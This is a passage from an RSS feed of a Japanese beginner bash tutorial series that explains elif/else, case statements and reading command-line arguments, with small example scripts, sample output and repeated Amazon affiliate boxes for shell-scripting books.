&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１１．else if と else】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/shellscript.jpg" alt="Featured image of post 【１１．else if と else】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="else-if-と-else">else if と else&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>else ifステートメントの使用：&lt;/b>&lt;/font>&lt;br>
else if条件の使用は、bashでは「elif」を定義します。&amp;lsquo;elseif_example.sh&amp;rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:elseif_example.sh" data-lang="bash:elseif_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたのラッキーナンバーを入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">101&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは一等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">510&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは二等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">elif&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">999&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは三等賞を獲得しました&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;すみません、またチャレンジして下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
101
あなたは一等賞を獲得しました
bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
999
あなたは三等賞を獲得しました
bash$ bash elseif_example.sh
あなたのラッキーナンバーを入力して下さい。
100
すみません、またチャレンジして下さい
bash$ bash elseif_example.sh
$
&lt;/code>&lt;/pre>&lt;table>
&lt;tr>&lt;td>比較演算子&lt;/td>&lt;td>使用例&lt;/td>&lt;td>意味&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-n&lt;/td>&lt;td>-n 文字列 &lt;/td>&lt;td>文字列の長さが0より大きければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-z&lt;/td>&lt;td>-z 文字列 &lt;/td>&lt;td>文字列の長さが0であれば真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>=&lt;/td>&lt;td>文字列A = 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しければ真&lt;/td>&lt;/tr>
&lt;tr>&lt;td>!=&lt;/td>&lt;td>文字列A != 文字列B &lt;/td>&lt;td>文字列Aと文字列Bが等しくなければ真&lt;/td>&lt;/tr>
&lt;/table>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。&lt;/dd>
&lt;dd>また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１２．case 文】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/shellscript.jpg" alt="Featured image of post 【１２．case 文】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="case-文">case 文&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>caseステートメントの使用：&lt;/b>&lt;/font>&lt;br>
caseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。&amp;lsquo;case_example.sh&amp;rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:case_example.sh" data-lang="bash:case_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたのラッキーナンバーを入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> n&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> in
101&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは一等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
510&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは二等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
999&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたは三等賞を獲得しました&amp;#34;&lt;/span> &lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;すみません、またチャレンジして下さい&amp;#34;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
101
あなたは一等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
510
あなたは二等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
999
あなたは三等賞を獲得しました
bash$ bash case_example.sh
あなたのラッキーナンバーを入力して下さい。
777
すみません、またチャレンジして下さい
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>case文の終わりには esac を指定します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１３．コマンドラインから引数を取得】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/shellscript.jpg" alt="Featured image of post 【１３．コマンドラインから引数を取得】ざっくりわかる「シェルスクリプト」" />&lt;h1 id="コマンドラインから引数を取得">コマンドラインから引数を取得&lt;/h1>
&lt;p>&lt;font color=orange>&lt;b>コマンドラインから引数を取得：&lt;/b>&lt;/font>&lt;br>
Bashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:command_line.sh" data-lang="bash:command_line.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;引数の数 : &lt;/span>&lt;span class="nv">$#&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;一つ目の引数 = &lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;二つ目の引数 = &lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash command_line.sh apple windows
引数の数 : 2
一つ目の引数 = apple
二つ目の引数 = windows
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の引数として変数を渡すときは、&amp;quot;$1&amp;quot; のようにダブルクォートで囲む癖をつけます。&lt;/dd>
&lt;dd>$1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。&lt;/dd>
&lt;dd>シェルスクリプトの変数はほとんどの場合は &amp;ldquo;$value&amp;rdquo; と囲みます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
